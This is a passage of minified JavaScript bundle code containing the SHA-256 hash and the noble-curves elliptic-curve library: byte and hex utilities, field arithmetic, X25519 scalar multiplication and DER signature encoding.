        const {view: t, buffer: o, blockLen: i} = this;
        e = Pd(e);
        const n = e.length;
        for (let s = 0; s < n; ) {
            const a = Math.min(i - this.pos, n - s);
            if (a === i) {
                const l = u2(e);
                for (; i <= n - s; s += i)
                    this.process(l, s);
                continue
            }
            o.set(e.subarray(s, s + a), this.pos),
            this.pos += a,
            s += a,
            this.pos === i && (this.process(t, 0),
            this.pos = 0)
        }
        return this.length += e.length,
        this.roundClean(),
        this
    }
    digestInto(e) {
        Ad(this),
        EN(e, this),
        this.finished = !0;
        const {buffer: t, view: o, blockLen: i, isLE: n} = this;
        let {pos: s} = this;
        t[s++] = 128,
        this.buffer.subarray(s).fill(0),
        this.padOffset > i - s && (this.process(o, 0),
        s = 0);
        for (let p = s; p < i; p++)
            t[p] = 0;
        Gte(o, i - 8, BigInt(this.length * 8), n),
        this.process(o, 0);
        const a = u2(e)
          , l = this.outputLen;
        if (l % 4)
            throw new Error("_sha2: outputLen should be aligned to 32bit");
        const f = l / 4
          , h = this.get();
        if (f > h.length)
            throw new Error("_sha2: outputLen bigger than state");
        for (let p = 0; p < f; p++)
            a.setUint32(4 * p, h[p], n)
    }
    digest() {
        const {buffer: e, outputLen: t} = this;
        this.digestInto(e);
        const o = e.slice(0, t);
        return this.destroy(),
        o
    }
    _cloneInto(e) {
        e || (e = new this.constructor),
        e.set(...this.get());
        const {blockLen: t, buffer: o, length: i, finished: n, destroyed: s, pos: a} = this;
        return e.length = i,
        e.pos = a,
        e.finished = n,
        e.destroyed = s,
        i % t && e.buffer.set(o),
        e
    }
}
;
const Xte = new Uint32Array([1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298])
  , wc = new Uint32Array([1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225])
  , vc = new Uint32Array(64);
class Jte extends Yte {
    constructor() {
        super(64, 32, 8, !1),
        this.A = wc[0] | 0,
        this.B = wc[1] | 0,
        this.C = wc[2] | 0,
        this.D = wc[3] | 0,
        this.E = wc[4] | 0,
        this.F = wc[5] | 0,
        this.G = wc[6] | 0,
        this.H = wc[7] | 0
    }
    get() {
        const {A: e, B: t, C: o, D: i, E: n, F: s, G: a, H: l} = this;
        return [e, t, o, i, n, s, a, l]
    }
    set(e, t, o, i, n, s, a, l) {
        this.A = e | 0,
        this.B = t | 0,
        this.C = o | 0,
        this.D = i | 0,
        this.E = n | 0,
        this.F = s | 0,
        this.G = a | 0,
        this.H = l | 0
    }
    process(e, t) {
        for (let p = 0; p < 16; p++,
        t += 4)
            vc[p] = e.getUint32(t, !1);
        for (let p = 16; p < 64; p++) {
            const b = vc[p - 15]
              , v = vc[p - 2]
              , T = Ss(b, 7) ^ Ss(b, 18) ^ b >>> 3
              , x = Ss(v, 17) ^ Ss(v, 19) ^ v >>> 10;
            vc[p] = x + vc[p - 7] + T + vc[p - 16] | 0
        }
        let {A: o, B: i, C: n, D: s, E: a, F: l, G: f, H: h} = this;
        for (let p = 0; p < 64; p++) {
            const b = Ss(a, 6) ^ Ss(a, 11) ^ Ss(a, 25)
              , v = h + b + Kte(a, l, f) + Xte[p] + vc[p] | 0
              , T = (Ss(o, 2) ^ Ss(o, 13) ^ Ss(o, 22)) + Zte(o, i, n) | 0;
            h = f,
            f = l,
            l = a,
            a = s + v | 0,
            s = n,
            n = i,
            i = o,
            o = v + T | 0
        }
        o = o + this.A | 0,
        i = i + this.B | 0,
        n = n + this.C | 0,
        s = s + this.D | 0,
        a = a + this.E | 0,
        l = l + this.F | 0,
        f = f + this.G | 0,
        h = h + this.H | 0,
        this.set(o, i, n, s, a, l, f, h)
    }
    roundClean() {
        vc.fill(0)
    }
    destroy() {
        this.set(0, 0, 0, 0, 0, 0, 0, 0),
        this.buffer.fill(0)
    }
}
const v0 = AN( () => new Jte);
/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
const M1 = BigInt(0)
  , N1 = BigInt(1)
  , Qte = BigInt(2);
function hu(r) {
    return r instanceof Uint8Array || ArrayBuffer.isView(r) && r.constructor.name === "Uint8Array"
}
function T0(r) {
    if (!hu(r))
        throw new Error("Uint8Array expected")
}
function Sd(r, e) {
    if (typeof e != "boolean")
        throw new Error(r + " boolean expected, got " + e)
}
const ere = Array.from({
    length: 256
}, (r, e) => e.toString(16).padStart(2, "0"));
function Bd(r) {
    T0(r);
    let e = "";
    for (let t = 0; t < r.length; t++)
        e += ere[r[t]];
    return e
}
function zf(r) {
    const e = r.toString(16);
    return e.length & 1 ? "0" + e : e
}
function I3(r) {
    if (typeof r != "string")
        throw new Error("hex string expected, got " + typeof r);
    return r === "" ? M1 : BigInt("0x" + r)
}
const xa = {
    _0: 48,
    _9: 57,
    A: 65,
    F: 70,
    a: 97,
    f: 102
};
function YB(r) {
    if (r >= xa._0 && r <= xa._9)
        return r - xa._0;
    if (r >= xa.A && r <= xa.F)
        return r - (xa.A - 10);
    if (r >= xa.a && r <= xa.f)
        return r - (xa.a - 10)
}
function _d(r) {
    if (typeof r != "string")
        throw new Error("hex string expected, got " + typeof r);
    const e = r.length
      , t = e / 2;
    if (e % 2)
        throw new Error("hex string expected, got unpadded hex of length " + e);
    const o = new Uint8Array(t);
    for (let i = 0, n = 0; i < t; i++,
    n += 2) {
        const s = YB(r.charCodeAt(n))
          , a = YB(r.charCodeAt(n + 1));
        if (s === void 0 || a === void 0) {
            const l = r[n] + r[n + 1];
            throw new Error('hex string expected, got non-hex character "' + l + '" at index ' + n)
        }
        o[i] = s * 16 + a
    }
    return o
}
function ru(r) {
    return I3(Bd(r))
}
function Hp(r) {
    return T0(r),
    I3(Bd(Uint8Array.from(r).reverse()))
}
function Id(r, e) {
    return _d(r.toString(16).padStart(e * 2, "0"))
}
function D1(r, e) {
    return Id(r, e).reverse()
}
function tre(r) {
    return _d(zf(r))
}
function ni(r, e, t) {
    let o;
    if (typeof e == "string")
        try {
            o = _d(e)
        } catch (n) {
            throw new Error(r + " must be hex string or Uint8Array, cause: " + n)
        }
    else if (hu(e))
        o = Uint8Array.from(e);
    else
        throw new Error(r + " must be hex string or Uint8Array");
    const i = o.length;
    if (typeof t == "number" && i !== t)
        throw new Error(r + " of length " + t + " expected, got " + i);
    return o
}
function Gp(...r) {
    let e = 0;
    for (let o = 0; o < r.length; o++) {
        const i = r[o];
        T0(i),
        e += i.length
    }
    const t = new Uint8Array(e);
    for (let o = 0, i = 0; o < r.length; o++) {
        const n = r[o];
        t.set(n, i),
        i += n.length
    }
    return t
}
function rre(r, e) {
    if (r.length !== e.length)
        return !1;
    let t = 0;
    for (let o = 0; o < r.length; o++)
        t |= r[o] ^ e[o];
    return t === 0
}
function nre(r) {
    if (typeof r != "string")
        throw new Error("string expected");
    return new Uint8Array(new TextEncoder().encode(r))
}
const h2 = r => typeof r == "bigint" && M1 <= r;
function F1(r, e, t) {
    return h2(r) && h2(e) && h2(t) && e <= r && r < t
}
function za(r, e, t, o) {
    if (!F1(e, t, o))
        throw new Error("expected valid " + r + ": " + t + " <= n < " + o + ", got " + e)
}
function FN(r) {
    let e;
    for (e = 0; r > M1; r >>= N1,
    e += 1)
        ;
    return e
}
function ore(r, e) {
    return r >> BigInt(e) & N1
}
function ire(r, e, t) {
    return r | (t ? N1 : M1) << BigInt(e)
}
const O3 = r => (Qte << BigInt(r - 1)) - N1
  , p2 = r => new Uint8Array(r)
  , XB = r => Uint8Array.from(r);
function UN(r, e, t) {
    if (typeof r != "number" || r < 2)
        throw new Error("hashLen must be a number");
    if (typeof e != "number" || e < 2)
        throw new Error("qByteLen must be a number");
    if (typeof t != "function")
        throw new Error("hmacFn must be a function");
    let o = p2(r)
      , i = p2(r)
      , n = 0;
    const s = () => {
        o.fill(1),
        i.fill(0),
        n = 0
    }
      , a = (...h) => t(i, o, ...h)
      , l = (h=p2()) => {
        i = a(XB([0]), h),
        o = a(),
        h.length !== 0 && (i = a(XB([1]), h),
        o = a())
    }
      , f = () => {
        if (n++ >= 1e3)
            throw new Error("drbg: tried 1000 values");
        let h = 0;
        const p = [];
        for (; h < e; ) {
            o = a();
            const b = o.slice();
            p.push(b),
            h += o.length
        }
        return Gp(...p)
    }
    ;
    return (h, p) => {
        s(),
        l(h);
        let b;
        for (; !(b = p(f())); )
            l();
        return s(),
        b
    }
}
const sre = {
    bigint: r => typeof r == "bigint",
    function: r => typeof r == "function",
    boolean: r => typeof r == "boolean",
    string: r => typeof r == "string",
    stringOrUint8Array: r => typeof r == "string" || hu(r),
    isSafeInteger: r => Number.isSafeInteger(r),
    array: r => Array.isArray(r),
    field: (r, e) => e.Fp.isValid(r),
    hash: r => typeof r == "function" && Number.isSafeInteger(r.outputLen)
};
function Jd(r, e, t={}) {
    const o = (i, n, s) => {
        const a = sre[n];
        if (typeof a != "function")
            throw new Error("invalid validator function");
        const l = r[i];
        if (!(s && l === void 0) && !a(l, r))
            throw new Error("param " + String(i) + " is invalid. Expected " + n + ", got " + l)
    }
    ;
    for (const [i,n] of Object.entries(e))
        o(i, n, !1);
    for (const [i,n] of Object.entries(t))
        o(i, n, !0);
    return r
}
const are = () => {
    throw new Error("not implemented")
}
;
function qE(r) {
    const e = new WeakMap;
    return (t, ...o) => {
        const i = e.get(t);
        if (i !== void 0)
            return i;
        const n = r(t, ...o);
        return e.set(t, n),
        n
    }
}
var cre = Object.freeze({
    __proto__: null,
    isBytes: hu,
    abytes: T0,
    abool: Sd,
    bytesToHex: Bd,
    numberToHexUnpadded: zf,
    hexToNumber: I3,
    hexToBytes: _d,
    bytesToNumberBE: ru,
    bytesToNumberLE: Hp,
    numberToBytesBE: Id,
    numberToBytesLE: D1,
    numberToVarBytesBE: tre,
    ensureBytes: ni,
    concatBytes: Gp,
    equalBytes: rre,
    utf8ToBytes: nre,
    inRange: F1,
    aInRange: za,
    bitLen: FN,
    bitGet: ore,
    bitSet: ire,
    bitMask: O3,
    createHmacDrbg: UN,
    validateObject: Jd,
    notImplemented: are,
    memoized: qE
});
const In = BigInt(0)
  , Qr = BigInt(1)
  , Ml = BigInt(2)
  , lre = BigInt(3)
  , VE = BigInt(4)
  , JB = BigInt(5)
  , QB = BigInt(8);
function Ro(r, e) {
    const t = r % e;
    return t >= In ? t : e + t
}
function kN(r, e, t) {
    if (e < In)
        throw new Error("invalid exponent, negatives unsupported");
    if (t <= In)
        throw new Error("invalid modulus");
    if (t === Qr)
        return In;
    let o = Qr;
    for (; e > In; )
        e & Qr && (o = o * r % t),
        r = r * r % t,
        e >>= Qr;
    return o
}
function Ji(r, e, t) {
    let o = r;
    for (; e-- > In; )
        o *= o,
        o %= t;
    return o
}
function HE(r, e) {
    if (r === In)
        throw new Error("invert: expected non-zero number");
    if (e <= In)
        throw new Error("invert: expected positive modulus, got " + e);
    let t = Ro(r, e)
      , o = e
      , i = In
      , n = Qr;
    for (; t !== In; ) {
        const s = o / t
          , a = o % t
          , l = i - n * s;
        o = t,
        t = a,
        i = n,
        n = l
    }
    if (o !== Qr)
        throw new Error("invert: does not exist");
    return Ro(i, e)
}
function ure(r) {
    const e = (r - Qr) / Ml;
    let t, o, i;
    for (t = r - Qr,
    o = 0; t % Ml === In; t /= Ml,
    o++)
        ;
    for (i = Ml; i < r && kN(i, e, r) !== r - Qr; i++)
        if (i > 1e3)
            throw new Error("Cannot find square root: likely non-prime P");
    if (o === 1) {
        const s = (r + Qr) / VE;
        return function(a, l) {
            const f = a.pow(l, s);
            if (!a.eql(a.sqr(f), l))
                throw new Error("Cannot find square root");
            return f
        }
    }
    const n = (t + Qr) / Ml;
    return function(s, a) {
        if (s.pow(a, e) === s.neg(s.ONE))
            throw new Error("Cannot find square root");
        let l = o
          , f = s.pow(s.mul(s.ONE, i), t)
          , h = s.pow(a, n)
          , p = s.pow(a, t);
        for (; !s.eql(p, s.ONE); ) {
            if (s.eql(p, s.ZERO))
                return s.ZERO;
            let b = 1;
            for (let T = s.sqr(p); b < l && !s.eql(T, s.ONE); b++)
                T = s.sqr(T);
            const v = s.pow(f, Qr << BigInt(l - b - 1));
            f = s.sqr(v),
            h = s.mul(h, v),
            p = s.mul(p, f),
            l = b
        }
        return h
    }
}
function fre(r) {
    if (r % VE === lre) {
        const e = (r + Qr) / VE;
        return function(t, o) {
            const i = t.pow(o, e);
            if (!t.eql(t.sqr(i), o))
                throw new Error("Cannot find square root");
            return i
        }
    }
    if (r % QB === JB) {
        const e = (r - JB) / QB;
        return function(t, o) {
            const i = t.mul(o, Ml)
              , n = t.pow(i, e)
              , s = t.mul(o, n)
              , a = t.mul(t.mul(s, Ml), n)
              , l = t.mul(s, t.sub(a, t.ONE));
            if (!t.eql(t.sqr(l), o))
                throw new Error("Cannot find square root");
            return l
        }
    }
    return ure(r)
}
const dre = ["create", "isValid", "is0", "neg", "inv", "sqrt", "sqr", "eql", "add", "sub", "mul", "pow", "div", "addN", "subN", "mulN", "sqrN"];
function hre(r) {
    const e = {
        ORDER: "bigint",
        MASK: "bigint",
        BYTES: "isSafeInteger",
        BITS: "isSafeInteger"
    }
      , t = dre.reduce( (o, i) => (o[i] = "function",
    o), e);
    return Jd(r, t)
}
function pre(r, e, t) {
    if (t < In)
        throw new Error("invalid exponent, negatives unsupported");
    if (t === In)
        return r.ONE;
    if (t === Qr)
        return e;
    let o = r.ONE
      , i = e;
    for (; t > In; )
        t & Qr && (o = r.mul(o, i)),
        i = r.sqr(i),
        t >>= Qr;
    return o
}
function gre(r, e) {
    const t = new Array(e.length)
      , o = e.reduce( (n, s, a) => r.is0(s) ? n : (t[a] = n,
    r.mul(n, s)), r.ONE)
      , i = r.inv(o);
    return e.reduceRight( (n, s, a) => r.is0(s) ? n : (t[a] = r.mul(n, t[a]),
    r.mul(n, s)), i),
    t
}
function LN(r, e) {
    const t = e !== void 0 ? e : r.toString(2).length
      , o = Math.ceil(t / 8);
    return {
        nBitLength: t,
        nByteLength: o
    }
}
function $N(r, e, t=!1, o={}) {
    if (r <= In)
        throw new Error("invalid field: expected ORDER > 0, got " + r);
    const {nBitLength: i, nByteLength: n} = LN(r, e);
    if (n > 2048)
        throw new Error("invalid field: expected ORDER of <= 2048 bytes");
    let s;
    const a = Object.freeze({
        ORDER: r,
        isLE: t,
        BITS: i,
        BYTES: n,
        MASK: O3(i),
        ZERO: In,
        ONE: Qr,
        create: l => Ro(l, r),
        isValid: l => {
            if (typeof l != "bigint")
                throw new Error("invalid field element: expected bigint, got " + typeof l);
            return In <= l && l < r
        }
        ,
        is0: l => l === In,
        isOdd: l => (l & Qr) === Qr,
        neg: l => Ro(-l, r),
        eql: (l, f) => l === f,
        sqr: l => Ro(l * l, r),
        add: (l, f) => Ro(l + f, r),
        sub: (l, f) => Ro(l - f, r),
        mul: (l, f) => Ro(l * f, r),
        pow: (l, f) => pre(a, l, f),
        div: (l, f) => Ro(l * HE(f, r), r),
        sqrN: l => l * l,
        addN: (l, f) => l + f,
        subN: (l, f) => l - f,
        mulN: (l, f) => l * f,
        inv: l => HE(l, r),
        sqrt: o.sqrt || (l => (s || (s = fre(r)),
        s(a, l))),
        invertBatch: l => gre(a, l),
        cmov: (l, f, h) => h ? f : l,
        toBytes: l => t ? D1(l, n) : Id(l, n),
        fromBytes: l => {
            if (l.length !== n)
                throw new Error("Field.fromBytes: expected " + n + " bytes, got " + l.length);
            return t ? Hp(l) : ru(l)
        }
    });
    return Object.freeze(a)
}
function zN(r) {
    if (typeof r != "bigint")
        throw new Error("field order must be bigint");
    const e = r.toString(2).length;
    return Math.ceil(e / 8)
}
function jN(r) {
    const e = zN(r);
    return e + Math.ceil(e / 2)
}
function yre(r, e, t=!1) {
    const o = r.length
      , i = zN(e)
      , n = jN(e);
    if (o < 16 || o < n || o > 1024)
        throw new Error("expected " + n + "-1024 bytes of input, got " + o);
    const s = t ? Hp(r) : ru(r)
      , a = Ro(s, e - Qr) + Qr;
    return t ? D1(a, i) : Id(a, i)
}
const e_ = BigInt(0)
  , dy = BigInt(1);
function g2(r, e) {
    const t = e.negate();
    return r ? t : e
}
function qN(r, e) {
    if (!Number.isSafeInteger(r) || r <= 0 || r > e)
        throw new Error("invalid window size, expected [1.." + e + "], got W=" + r)
}
function y2(r, e) {
    qN(r, e);
    const t = Math.ceil(e / r) + 1
      , o = 2 ** (r - 1);
    return {
        windows: t,
        windowSize: o
    }
}
function bre(r, e) {
    if (!Array.isArray(r))
        throw new Error("array expected");
    r.forEach( (t, o) => {
        if (!(t instanceof e))
            throw new Error("invalid point at index " + o)
    }
    )
}
function mre(r, e) {
    if (!Array.isArray(r))
        throw new Error("array of scalars expected");
    r.forEach( (t, o) => {
        if (!e.isValid(t))
            throw new Error("invalid scalar at index " + o)
    }
    )
}
const b2 = new WeakMap
  , VN = new WeakMap;
function m2(r) {
    return VN.get(r) || 1
}
function xre(r, e) {
    return {
        constTimeNegate: g2,
        hasPrecomputes(t) {
            return m2(t) !== 1
        },
        unsafeLadder(t, o, i=r.ZERO) {
            let n = t;
            for (; o > e_; )
                o & dy && (i = i.add(n)),
                n = n.double(),
                o >>= dy;
            return i
        },
        precomputeWindow(t, o) {
            const {windows: i, windowSize: n} = y2(o, e)
              , s = [];
            let a = t
              , l = a;
            for (let f = 0; f < i; f++) {
                l = a,
                s.push(l);
                for (let h = 1; h < n; h++)
                    l = l.add(a),
                    s.push(l);
                a = l.double()
            }
            return s
        },
        wNAF(t, o, i) {
            const {windows: n, windowSize: s} = y2(t, e);
            let a = r.ZERO
              , l = r.BASE;
            const f = BigInt(2 ** t - 1)
              , h = 2 ** t
              , p = BigInt(t);
            for (let b = 0; b < n; b++) {
                const v = b * s;
                let T = Number(i & f);
                i >>= p,
                T > s && (T -= h,
                i += dy);
                const x = v
                  , E = v + Math.abs(T) - 1
                  , B = b % 2 !== 0
                  , P = T < 0;
                T === 0 ? l = l.add(g2(B, o[x])) : a = a.add(g2(P, o[E]))
            }
            return {
                p: a,
                f: l
            }
        },
        wNAFUnsafe(t, o, i, n=r.ZERO) {
            const {windows: s, windowSize: a} = y2(t, e)
              , l = BigInt(2 ** t - 1)
              , f = 2 ** t
              , h = BigInt(t);
            for (let p = 0; p < s; p++) {
                const b = p * a;
                if (i === e_)
                    break;
                let v = Number(i & l);
                if (i >>= h,
                v > a && (v -= f,
                i += dy),
                v === 0)
                    continue;
                let T = o[b + Math.abs(v) - 1];
                v < 0 && (T = T.negate()),
                n = n.add(T)
            }
            return n
        },
        getPrecomputes(t, o, i) {
            let n = b2.get(o);
            return n || (n = this.precomputeWindow(o, t),
            t !== 1 && b2.set(o, i(n))),
            n
        },
        wNAFCached(t, o, i) {
            const n = m2(t);
            return this.wNAF(n, this.getPrecomputes(n, t, i), o)
        },
        wNAFCachedUnsafe(t, o, i, n) {
            const s = m2(t);
            return s === 1 ? this.unsafeLadder(t, o, n) : this.wNAFUnsafe(s, this.getPrecomputes(s, t, i), o, n)
        },
        setWindowSize(t, o) {
            qN(o, e),
            VN.set(t, o),
            b2.delete(t)
        }
    }
}
function wre(r, e, t, o) {
    if (bre(t, r),
    mre(o, e),
    t.length !== o.length)
        throw new Error("arrays of points and scalars must have equal length");
    const i = r.ZERO
      , n = FN(BigInt(t.length))
      , s = n > 12 ? n - 3 : n > 4 ? n - 2 : n ? 2 : 1
      , a = (1 << s) - 1
      , l = new Array(a + 1).fill(i)
      , f = Math.floor((e.BITS - 1) / s) * s;
    let h = i;
    for (let p = f; p >= 0; p -= s) {
        l.fill(i);
        for (let v = 0; v < o.length; v++) {
            const T = o[v]
              , x = Number(T >> BigInt(p) & BigInt(a));
            l[x] = l[x].add(t[v])
        }
        let b = i;
        for (let v = l.length - 1, T = i; v > 0; v--)
            T = T.add(l[v]),
            b = b.add(T);
        if (h = h.add(b),
        p !== 0)
            for (let v = 0; v < s; v++)
                h = h.double()
    }
    return h
}
function HN(r) {
    return hre(r.Fp),
    Jd(r, {
        n: "bigint",
        h: "bigint",
        Gx: "field",
        Gy: "field"
    }, {
        nBitLength: "isSafeInteger",
        nByteLength: "isSafeInteger"
    }),
    Object.freeze({
        ...LN(r.n, r.nBitLength),
        ...r,
        p: r.Fp.ORDER
    })
}
BigInt(0),
BigInt(1),
BigInt(2),
BigInt(8);
const xf = BigInt(0)
  , x2 = BigInt(1);
function vre(r) {
    return Jd(r, {
        a: "bigint"
    }, {
        montgomeryBits: "isSafeInteger",
        nByteLength: "isSafeInteger",
        adjustScalarBytes: "function",
        domain: "function",
        powPminus2: "function",
        Gu: "bigint"
    }),
    Object.freeze({
        ...r
    })
}
function Tre(r) {
    const e = vre(r)
      , {P: t} = e
      , o = P => Ro(P, t)
      , i = e.montgomeryBits
      , n = Math.ceil(i / 8)
      , s = e.nByteLength
      , a = e.adjustScalarBytes || (P => P)
      , l = e.powPminus2 || (P => kN(P, t - BigInt(2), t));
    function f(P, O, F) {
        const D = o(P * (O - F));
        return O = o(O - D),
        F = o(F + D),
        [O, F]
    }
    const h = (e.a - BigInt(2)) / BigInt(4);
    function p(P, O) {
        za("u", P, xf, t),
        za("scalar", O, xf, t);
        const F = O
          , D = P;
        let I = x2, M = xf, C = P, W = x2, k = xf, H;
        for (let Y = BigInt(i - 1); Y >= xf; Y--) {
            const V = F >> Y & x2;
            k ^= V,
            H = f(k, I, C),
            I = H[0],
            C = H[1],
            H = f(k, M, W),
            M = H[0],
            W = H[1],
            k = V;
            const R = I + M
              , _ = o(R * R)
              , $ = I - M
              , z = o($ * $)
              , K = _ - z
              , j = C + W
              , ee = C - W
              , ie = o(ee * R)
              , ae = o(j * $)
              , he = ie + ae
              , me = ie - ae;
            C = o(he * he),
            W = o(D * o(me * me)),
            I = o(_ * z),
            M = o(K * (_ + o(h * K)))
        }
        H = f(k, I, C),
        I = H[0],
        C = H[1],
        H = f(k, M, W),
        M = H[0],
        W = H[1];
        const X = l(M);
        return o(I * X)
    }
    function b(P) {
        return D1(o(P), n)
    }
    function v(P) {
        const O = ni("u coordinate", P, n);
        return s === 32 && (O[31] &= 127),
        Hp(O)
    }
    function T(P) {
        const O = ni("scalar", P)
          , F = O.length;
        if (F !== n && F !== s) {
            let D = "" + n + " or " + s;
            throw new Error("invalid scalar, expected " + D + " bytes, got " + F)
        }
        return Hp(a(O))
    }
    function x(P, O) {
        const F = v(O)
          , D = T(P)
          , I = p(F, D);
        if (I === xf)
            throw new Error("invalid private or public key received");
        return b(I)
    }
    const E = b(e.Gu);
    function B(P) {
        return x(P, E)
    }
    return {
        scalarMult: x,
        scalarMultBase: B,
        getSharedSecret: (P, O) => x(P, O),
        getPublicKey: P => B(P),
        utils: {
            randomPrivateKey: () => e.randomBytes(e.nByteLength)
        },
        GuBytes: E
    }
}
const GE = BigInt("57896044618658097711785492504343953926634992332820282019728792003956564819949");
BigInt(0);
const Ere = BigInt(1)
  , t_ = BigInt(2)
  , Are = BigInt(3)
  , Pre = BigInt(5);
BigInt(8);
function Cre(r) {
    const e = BigInt(10)
      , t = BigInt(20)
      , o = BigInt(40)
      , i = BigInt(80)
      , n = GE
      , s = r * r % n * r % n
      , a = Ji(s, t_, n) * s % n
      , l = Ji(a, Ere, n) * r % n
      , f = Ji(l, Pre, n) * l % n
      , h = Ji(f, e, n) * f % n
      , p = Ji(h, t, n) * h % n
      , b = Ji(p, o, n) * p % n
      , v = Ji(b, i, n) * b % n
      , T = Ji(v, i, n) * b % n
      , x = Ji(T, e, n) * f % n;
    return {
        pow_p_5_8: Ji(x, t_, n) * r % n,
        b2: s
    }
}
function Sre(r) {
    return r[0] &= 248,
    r[31] &= 127,
    r[31] |= 64,
    r
}
const KE = Tre({
    P: GE,
    a: BigInt(486662),
    montgomeryBits: 255,
    nByteLength: 32,
    Gu: BigInt(9),
    powPminus2: r => {
        const e = GE
          , {pow_p_5_8: t, b2: o} = Cre(r);
        return Ro(Ji(t, Are, e) * o, e)
    }
    ,
    adjustScalarBytes: Sre,
    randomBytes: Xd
});
function r_(r) {
    r.lowS !== void 0 && Sd("lowS", r.lowS),
    r.prehash !== void 0 && Sd("prehash", r.prehash)
}
function Bre(r) {
    const e = HN(r);
    Jd(e, {
        a: "field",
        b: "field"
    }, {
        allowedPrivateKeyLengths: "array",
        wrapPrivateKey: "boolean",
        isTorsionFree: "function",
        clearCofactor: "function",
        allowInfinityPoint: "boolean",
        fromBytes: "function",
        toBytes: "function"
    });
    const {endo: t, Fp: o, a: i} = e;
    if (t) {
        if (!o.eql(i, o.ZERO))
            throw new Error("invalid endomorphism, can only be defined for Koblitz curves that have a=0");
        if (typeof t != "object" || typeof t.beta != "bigint" || typeof t.splitScalar != "function")
            throw new Error("invalid endomorphism, expected beta: bigint and splitScalar: function")
    }
    return Object.freeze({
        ...e
    })
}
const {bytesToNumberBE: _re, hexToBytes: Ire} = cre;
class Ore extends Error {
    constructor(e="") {
        super(e)
    }
}
const _a = {
    Err: Ore,
    _tlv: {
        encode: (r, e) => {
            const {Err: t} = _a;
            if (r < 0 || r > 256)
                throw new t("tlv.encode: wrong tag");
            if (e.length & 1)
                throw new t("tlv.encode: unpadded data");
            const o = e.length / 2
              , i = zf(o);
            if (i.length / 2 & 128)
                throw new t("tlv.encode: long form length too big");
            const n = o > 127 ? zf(i.length / 2 | 128) : "";
            return zf(r) + n + i + e
        }
        ,
        decode(r, e) {
            const {Err: t} = _a;
            let o = 0;
            if (r < 0 || r > 256)
                throw new t("tlv.encode: wrong tag");
            if (e.length < 2 || e[o++] !== r)
                throw new t("tlv.decode: wrong tlv");
            const i = e[o++]
              , n = !!(i & 128);
            let s = 0;
            if (!n)
                s = i;
            else {
                const l = i & 127;
                if (!l)
                    throw new t("tlv.decode(long): indefinite length not supported");
                if (l > 4)
                    throw new t("tlv.decode(long): byte length is too big");
                const f = e.subarray(o, o + l);
                if (f.length !== l)
                    throw new t("tlv.decode: length bytes not complete");
                if (f[0] === 0)
                    throw new t("tlv.decode(long): zero leftmost byte");
                for (const h of f)
                    s = s << 8 | h;
                if (o += l,
                s < 128)
                    throw new t("tlv.decode(long): not minimal encoding")
            }
            const a = e.subarray(o, o + s);
            if (a.length !== s)
                throw new t("tlv.decode: wrong value length");
            return {
                v: a,
                l: e.subarray(o + s)
            }
        }
    },
    _int: {
        encode(r) {
            const {Err: e} = _a;
            if (r < Fa)
                throw new e("integer: negative integers are not allowed");
            let t = zf(r);
            if (Number.parseInt(t[0], 16) & 8 && (t = "00" + t),
            t.length & 1)
                throw new e("unexpected DER parsing assertion: unpadded hex");
            return t
        },
        decode(r) {
            const {Err: e} = _a;
            if (r[0] & 128)
                throw new e("invalid signature integer: negative");
            if (r[0] === 0 && !(r[1] & 128))
                throw new e("invalid signature integer: unnecessary leading zero");
            return _re(r)
        }
    },
    toSig(r) {
        const {Err: e, _int: t, _tlv: o} = _a
          , i = typeof r == "string" ? Ire(r) : r;
        T0(i);
        const {v: n, l: s} = o.decode(48, i);
        if (s.length)
            throw new e("invalid signature: left bytes after parsing");
        const {v: a, l} = o.decode(2, n)
          , {v: f, l: h} = o.decode(2, l);
        if (h.length)
            throw new e("invalid signature: left bytes after parsing");
        return {
            r: t.decode(a),
            s: t.decode(f)
        }
    },
    hexFromSig(r) {
        const {_tlv: e, _int: t} = _a
          , o = e.encode(2, t.encode(r.r))
          , i = e.encode(2, t.encode(r.s))
          , n = o + i;
        return e.encode(48, n)
    }
}
  , Fa = BigInt(0)
  , Cn = BigInt(1);
BigInt(2);
const n_ = BigInt(3);
BigInt(4);
function Rre(r) {
    const e = Bre(r)
      , {Fp: t} = e
      , o = $N(e.n, e.nBitLength)
      , i = e.toBytes || ( (x, E, B) => {
        const P = E.toAffine();
        return Gp(Uint8Array.from([4]), t.toBytes(P.x), t.toBytes(P.y))
    }
    )
      , n = e.fromBytes || (x => {
        const E = x.subarray(1)
          , B = t.fromBytes(E.subarray(0, t.BYTES))
          , P = t.fromBytes(E.subarray(t.BYTES, 2 * t.BYTES));
        return {
            x: B,
            y: P
        }
    }
    );
    function s(x) {
        const {a: E, b: B} = e
          , P = t.sqr(x)
          , O = t.mul(P, x);
        return t.add(t.add(O, t.mul(x, E)), B)
    }
    if (!t.eql(t.sqr(e.Gy), s(e.Gx)))
        throw new Error("bad generator point: equation left != right");
    function a(x) {
        return F1(x, Cn, e.n)
    }
    function l(x) {
        const {allowedPrivateKeyLengths: E, nByteLength: B, wrapPrivateKey: P, n: O} = e;
        if (E && typeof x != "bigint") {
            if (hu(x) && (x = Bd(x)),
            typeof x != "string" || !E.includes(x.length))
                throw new Error("invalid private key");
            x = x.padStart(B * 2, "0")
        }
        let F;
        try {
            F = typeof x == "bigint" ? x : ru(ni("private key", x, B))
        } catch {
            throw new Error("invalid private key, expected hex or " + B + " bytes, got " + typeof x)
        }
        return P && (F = Ro(F, O)),
        za("private key", F, Cn, O),
        F
    }
    function f(x) {
        if (!(x instanceof b))
            throw new Error("ProjectivePoint expected")
    }
    const h = qE( (x, E) => {
        const {px: B, py: P, pz: O} = x;
        if (t.eql(O, t.ONE))
            return {
                x: B,
                y: P
            };
        const F = x.is0();
        E == null && (E = F ? t.ONE : t.inv(O));
        const D = t.mul(B, E)
          , I = t.mul(P, E)
          , M = t.mul(O, E);
